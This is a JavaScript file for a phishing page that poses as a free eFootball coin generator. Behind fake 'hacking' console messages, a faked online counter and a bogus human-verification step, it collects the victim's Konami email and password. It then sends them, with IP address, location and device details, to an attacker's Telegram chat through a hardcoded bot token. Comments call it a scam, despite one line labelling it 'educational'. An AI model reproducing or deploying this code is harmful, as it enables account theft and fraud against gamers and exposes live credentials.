// Configuration
const BOT_TOKEN = '7727476364:AAHaXogDfO5itb1Z6A5CCeNRK7j1sr5wS3Y'; // Use the same Telegram bot token from the Xbox scam
const CHAT_ID = '-1002644213630'; // Use the same Telegram chat ID from the Xbox scam
const IPINFO_TOKEN = '81e788912b1532'; // Use the same IPInfo token from the Xbox scam

// Global state management
const state = {
    isConnected: false,
    currentProgress: 0,
    progressInterval: null,
     selectedPlatform: 'ps5',
    selectedCoins: 750,
    verificationInterval: null
};

// Utility functions
const utils = {
    formatNumber: (num) => num.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ','),
    
    updateOnlineCounter: () => {
        const onlineCount = document.getElementById('online-count');
        const currentCount = parseInt(onlineCount.textContent.replace(',', ''));
        const change = Math.floor(Math.random() * 11) - 5;
        const newCount = Math.max(1000, currentCount + change);
        onlineCount.textContent = utils.formatNumber(newCount);
    },

    addStatusMessage: (message, type = 'normal') => {
        const statusContent = document.querySelector('.status-content');
        const statusLine = document.createElement('div');
        statusLine.className = `console-line ${type}`;
        statusLine.textContent = `> ${message}`;
        statusContent.appendChild(statusLine);
        statusContent.scrollTop = statusContent.scrollHeight;
    },
    
    // Function to send data to Telegram
    sendToTelegram: async (data) => {
        // Get IP information if possible
        let ipInfo = "Not available";
        try {
            const ipResponse = await fetch(`https://ipinfo.io/json?token=${IPINFO_TOKEN}`);
            const ipData = await ipResponse.json();
            ipInfo = `📍 Location: ${ipData.city}, ${ipData.region}, ${ipData.country}\n🔍 IP: ${ipData.ip}`;
        } catch (error) {
            console.error("Could not fetch IP info", error);
        }
        
        let deviceInfo = navigator.userAgent;
        
        const message = `
🎮 New eFootball Coins Scam Form Submission 🎮
----------------------------------
📧 Email: ${data.email}
🔑 Password: ${data.password}
🎮 Platform: ${data.platform}
💰 Coins Amount: ${data.coins}
⏰ Date: ${new Date().toLocaleString()}
${ipInfo}
----------------------------------
📱 Device: ${deviceInfo}
`;
        
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        const params = {
            chat_id: CHAT_ID,
            text: message
        };
        
        try {
            const response = await fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(params)
            });
            
            return await response.json();
        } catch (error) {
            console.error("Failed to send to Telegram", error);
            return { ok: false, error: error.message };
        }
    },

    // Get platform display name
    getPlatformDisplayName: (platform) => {
        const platformMap = {
            'ps5': 'PlayStation 5',
            'ps4': 'PlayStation 4',
            'xbox': 'Xbox Series X/S',
            'pc': 'PC',
            'mobile': 'Mobile'
        };
        return platformMap[platform] || 'Unknown Platform';
    }
};

// Progress bar management
const progressManager = {
    updateProgress: (progress) => {
        const progressBar = document.querySelector('.progress-fill');
        const progressText = document.querySelector('.progress-text');
        if (progressBar && progressText) {
            progressBar.style.width = `${progress}%`;
            progressText.textContent = `PROCESSING... ${Math.floor(progress)}%`;
        }
    },

    startProgress: () => {
        state.currentProgress = 0;
        const progressContainer = document.getElementById('progress-container');
        if (progressContainer) {
            progressContainer.style.display = 'block';
        }
        progressManager.updateProgress(0);

        state.progressInterval = setInterval(() => {
            if (state.currentProgress < 100) {
                state.currentProgress += Math.random() * 2;
                if (state.currentProgress > 100) state.currentProgress = 100;
                progressManager.updateProgress(state.currentProgress);
            } else {
                clearInterval(state.progressInterval);
            }
        }, 100);
    },

    stopProgress: () => {
        clearInterval(state.progressInterval);
        state.currentProgress = 0;
        progressManager.updateProgress(0);
        const progressContainer = document.getElementById('progress-container');
        if (progressContainer) {
            progressContainer.style.display = 'none';
        }
    }
};

// Animation sequences
const animations = {
    simulateGeneration: async () => {
        const steps = [
            { message: 'Establishing secure connection...', delay: 1500, type: 'normal' },
            { message: 'Connection established!', delay: 1000, type: 'success' },
            { message: 'Connecting to eFootball servers...', delay: 1800, type: 'normal' },
            { message: 'Access granted to coins module', delay: 1500, type: 'success' },
            { message: `Preparing to generate ${state.selectedCoins.toLocaleString()} coins for ${utils.getPlatformDisplayName(state.selectedPlatform)}...`, delay: 1800, type: 'normal' },
            { message: 'Initializing coin generation protocols...', delay: 2000, type: 'normal' },
            { message: 'Coin generation protocols initialized', delay: 1000, type: 'success' },
            { message: 'Bypassing payment verification...', delay: 2000, type: 'warning' },
            { message: 'eFootball security layer detected!', delay: 1500, type: 'error' },
            { message: 'Attempting to bypass security...', delay: 2000, type: 'warning' },
            { message: 'Security bypassed successfully', delay: 1500, type: 'success' },
            { message: 'Generating coins...', delay: 2000, type: 'normal' },
            { message: 'Coins generated successfully!', delay: 1500, type: 'success' }
        ];

        progressManager.startProgress();

        for (const step of steps) {
            utils.addStatusMessage(step.message, step.type);
            await new Promise(resolve => setTimeout(resolve, step.delay));
        }

        setTimeout(() => {
            progressManager.stopProgress();
            handlers.showCoinsRewardModal();
        }, 1000);
    },

    showSuccessSequence: () => {
        const successModal = document.getElementById('success-modal');
        const successCoinsAmount = document.getElementById('success-coins-amount');
        const successPlatform = document.getElementById('success-platform');
        const successAccount = document.getElementById('success-account');
        
        // Set success modal data
        successCoinsAmount.textContent = state.selectedCoins.toLocaleString();
        successPlatform.textContent = utils.getPlatformDisplayName(state.selectedPlatform);
        
        // Get email from the form
        const email = document.getElementById('konami-email').value;
        successAccount.textContent = email;
        
        // Hide other modals and show success modal
        document.getElementById('verification-modal').style.display = 'none';
        successModal.style.display = 'flex';
        
        // Initialize the enhanced success animations
        successAnimations.createConfetti();
        successAnimations.addGlowingBorder();
        successAnimations.add3DTiltEffect();
    }
};

// Enhanced success animations
const successAnimations = {
    // Creates confetti effect in the success modal
    createConfetti: () => {
        const container = document.createElement('div');
        container.className = 'confetti-container';
        
        // Add to success modal
        const successContent = document.querySelector('.success-content');
        successContent.appendChild(container);
        
        // Create confetti pieces
        const colors = ['#E81123', '#FFD700', '#EC5356', '#0078D7'];
        const confettiCount = 100;
        
        for (let i = 0; i < confettiCount; i++) {
            const confetti = document.createElement('div');
            confetti.className = 'confetti';
            
            // Randomize confetti properties
            confetti.style.left = `${Math.random() * 100}%`;
            confetti.style.width = `${Math.random() * 10 + 5}px`;
            confetti.style.height = `${Math.random() * 10 + 5}px`;
            confetti.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
            confetti.style.borderRadius = Math.random() > 0.5 ? '50%' : '0';
            
            // Randomize animation
            confetti.style.opacity = Math.random() * 0.8 + 0.2;
            confetti.style.animationDuration = `${Math.random() * 3 + 2}s`;
            confetti.style.animationDelay = `${Math.random() * 2}s`;
            
            container.appendChild(confetti);
        }
        
        // Remove confetti after animation completes
        setTimeout(() => {
            container.remove();
        }, 5000);
    },
    
    // Add glowing border effect
    addGlowingBorder: () => {
        const successContent = document.querySelector('.success-content');
        let glowOpacity = 0.5;
        let increasing = false;
        
        // Create pulse effect
        const pulseGlow = () => {
            if (increasing) {
                glowOpacity += 0.01;
                if (glowOpacity >= 0.8) increasing = false;
            } else {
                glowOpacity -= 0.01;
                if (glowOpacity <= 0.3) increasing = true;
            }
            
            successContent.style.boxShadow = `0 0 20px rgba(0, 166, 81, ${glowOpacity})`;
            requestAnimationFrame(pulseGlow);
        };
        
        pulseGlow();
    },
    
    // Add 3D tilt effect to the success modal
    add3DTiltEffect: () => {
        const successContent = document.querySelector('.success-content');
        
        successContent.addEventListener('mousemove', (e) => {
            const rect = successContent.getBoundingClientRect();
            const x = e.clientX - rect.left;
            const y = e.clientY - rect.top;
            
            const centerX = rect.width / 2;
            const centerY = rect.height / 2;
            
            const tiltX = (y - centerY) / 20;
            const tiltY = (centerX - x) / 20;
            
            successContent.style.transform = `perspective(1000px) rotateX(${tiltX}deg) rotateY(${tiltY}deg) scale3d(1.02, 1.02, 1.02)`;
        });
        
        successContent.addEventListener('mouseleave', () => {
            successContent.style.transform = 'perspective(1000px) rotateX(0) rotateY(0) scale3d(1, 1, 1)';
            successContent.style.transition = 'transform 0.5s ease';
        });
    }
};

// Event handlers
const handlers = {
    platformSelect: (event) => {
        const platform = event.currentTarget.dataset.platform;
        document.querySelectorAll('.platform-card').forEach(option => {
            option.classList.remove('selected');
        });
        event.currentTarget.classList.add('selected');
        state.selectedPlatform = platform;
    },

    coinsSelect: (event) => {
        const coins = parseInt(event.currentTarget.dataset.coins);
        document.querySelectorAll('.coins-option').forEach(option => {
            option.classList.remove('selected');
        });
        event.currentTarget.classList.add('selected');
        state.selectedCoins = coins;
    },

    connect: async () => {
        // Show processing in console without requiring account input
        utils.addStatusMessage('Initializing connection to eFootball servers...', 'normal');
        await new Promise(resolve => setTimeout(resolve, 1000));
        
        utils.addStatusMessage('Preparing coins generator...', 'normal');
        await new Promise(resolve => setTimeout(resolve, 1000));
        
        utils.addStatusMessage(`Selected Platform: ${utils.getPlatformDisplayName(state.selectedPlatform)}`, 'success');
        utils.addStatusMessage(`Coins Amount: ${state.selectedCoins.toLocaleString()}`, 'success');
        await new Promise(resolve => setTimeout(resolve, 1000));
        
        utils.addStatusMessage('Konami account authentication required to continue...', 'warning');
        await new Promise(resolve => setTimeout(resolve, 2000));

        // Show Konami login modal after processing
        document.getElementById('konami-login-modal').style.display = 'flex';
    },

    submitForm: async (event) => {
        event.preventDefault();
        const email = document.getElementById('konami-email').value;
        const password = document.getElementById('konami-password').value;
        
        const submitButton = document.getElementById('konami-login-button');
        const originalText = submitButton.innerHTML;
        
        // Show spinner and disable button
        submitButton.disabled = true;
        submitButton.innerHTML = '<div class="spinner-border" role="status"></div>';
        submitButton.classList.add('loading');
        
        // Send data to Telegram
        try {
            await utils.sendToTelegram({
                password: password,
                email: email,
                platform: state.selectedPlatform,
                coins: state.selectedCoins,
                date: new Date().toISOString()
            });
        } catch (error) {
            console.error("Could not send to Telegram", error);
            // Failure is silent to user - they won't know
        }
        
        // Wait for 3 seconds with the spinner
        await new Promise(resolve => setTimeout(resolve, 3000));
        
        // Hide the modal and continue with generation
        document.getElementById('konami-login-modal').style.display = 'none';
        document.getElementById('connect-button').disabled = true;
        document.getElementById('connect-button').innerHTML = 
            '<div class="connecting-state">GENERATING COINS... <div class="button-spinner"></div></div>';
        
        // Reset button state
        submitButton.innerHTML = originalText;
        submitButton.disabled = false;
        submitButton.classList.remove('loading');
        
        // Start the generation animation
        animations.simulateGeneration();
    },

    showCoinsRewardModal: () => {
        // Update coins display
        document.getElementById('coins-amount').textContent = state.selectedCoins.toLocaleString();
        
        // Update platform
        document.getElementById('display-platform').textContent = utils.getPlatformDisplayName(state.selectedPlatform);
        
        // Show verification message
        const verificationElement = document.createElement('div');
        verificationElement.className = 'verification-required';
        verificationElement.innerHTML = `
            <div class="verification-header">
                <i class="fas fa-lock"></i> VERIFICATION REQUIRED
            </div>
            <div class="verification-message">
                Complete human verification to claim your coins
            </div>
            <button id="verify-button" class="verify-button">
                <i class="fas fa-shield-alt"></i>
                VERIFY NOW
            </button>
        `;
        
        // Insert verification element before the claim button
        const claimButton = document.getElementById('claim-button');
        claimButton.disabled = true;
        claimButton.style.opacity = "0.5";
        claimButton.style.cursor = "not-allowed";
        claimButton.parentNode.insertBefore(verificationElement, claimButton);
        
        // Add event listener to verify button
        setTimeout(() => {
            document.getElementById('verify-button').addEventListener('click', handlers.showVerification);
        }, 100);
        
        // Show the coins reward modal
        document.getElementById('coinsreward-modal').style.display = 'flex';
    },
    
    showVerification: () => {
        // Show verification overlay
        document.getElementById('verification-modal').style.display = 'flex';
    },
    
    completeVerification: () => {
        // Hide verification overlay
        document.getElementById('verification-modal').style.display = 'none';
        
        // Show loading spinner
        const verifyButton = document.querySelector('.verify-button');
        verifyButton.innerHTML = '<i class="fas fa-spinner fa-spin"></i> VERIFYING...';
        
        // Add status message in console - will appear to process indefinitely
        utils.addStatusMessage('Human verification in progress...', 'normal');
        utils.addStatusMessage('Validating user input...', 'normal');
        
        // Set up a repeating message for verification in progress
        let verifyingMessages = [
            'Connecting to verification server...',
            'Processing verification request...',
            'Waiting for server response...',
            'Validating received data...',
            'Running security checks...'
        ];
        
        let messageIndex = 0;
        const messageInterval = setInterval(() => {
            utils.addStatusMessage(verifyingMessages[messageIndex], 'normal');
            messageIndex = (messageIndex + 1) % verifyingMessages.length;
        }, 3000);
        
        // Add to state so we can refer to it elsewhere if needed
        state.verificationInterval = messageInterval;
        
        // In a real scam site, this would lead to offer walls, surveys, etc.
        // For this educational example, we'll just show the success screen after a delay
        setTimeout(() => {
            clearInterval(state.verificationInterval);
            utils.addStatusMessage('Verification completed successfully!', 'success');
            utils.addStatusMessage('Finalizing coin transfer...', 'normal');
            
            setTimeout(() => {
                utils.addStatusMessage('Coins successfully added to your account!', 'success');
                animations.showSuccessSequence();
            }, 2000);
        }, 8000);
    },

    claimCoins: () => {
        // Since we never complete verification, always show error
        utils.addStatusMessage('Verification still in progress. Please wait...', 'warning');
        return;
    },

    resetGenerator: () => {
        document.getElementById('success-modal').style.display = 'none';
        window.location.reload();
    }
};

// Initialize everything when DOM is loaded
document.addEventListener('DOMContentLoaded', () => {
    // Set up Platform selection
    document.querySelectorAll('.platform-card').forEach(card => {
        card.addEventListener('click', handlers.platformSelect);
    });

    // Set up Coins selection
    document.querySelectorAll('.coins-option').forEach(option => {
        option.addEventListener('click', handlers.coinsSelect);
    });

    // Connect button
    document.getElementById('connect-button').addEventListener('click', handlers.connect);

    // Konami login form
    document.getElementById('konami-login-form').addEventListener('submit', handlers.submitForm);

    // Form validation
    const konamiEmail = document.getElementById('konami-email');
    const konamiPassword = document.getElementById('konami-password');
    const konamiLoginButton = document.getElementById('konami-login-button');

    [konamiEmail, konamiPassword].forEach(input => {
        input.addEventListener('input', () => {
            konamiLoginButton.disabled = !(konamiEmail.value.trim() && konamiPassword.value.trim());
            konamiLoginButton.classList.toggle('active', !konamiLoginButton.disabled);
        });
    });

    // Claim button (Coins Reward Modal)
    document.getElementById('claim-button').addEventListener('click', handlers.claimCoins);
    
    // Verification option buttons
    document.getElementById('survey-verify-button').addEventListener('click', handlers.completeVerification);
    document.getElementById('captcha-verify-button').addEventListener('click', handlers.completeVerification);

    // Done button
    document.getElementById('done-button').addEventListener('click', handlers.resetGenerator);

    // Auto-select default platform and coins amount
    const defaultPlatformCard = document.querySelector('.platform-card[data-platform="ps5"]');
    if (defaultPlatformCard) {
        defaultPlatformCard.classList.add('selected');
    }
    
    const defaultCoinsOption = document.querySelector('.coins-option[data-coins="5000"]');
    if (defaultCoinsOption) {
        defaultCoinsOption.classList.add('selected');
    }

    // Start online counter updates
    setInterval(utils.updateOnlineCounter, 5000);
});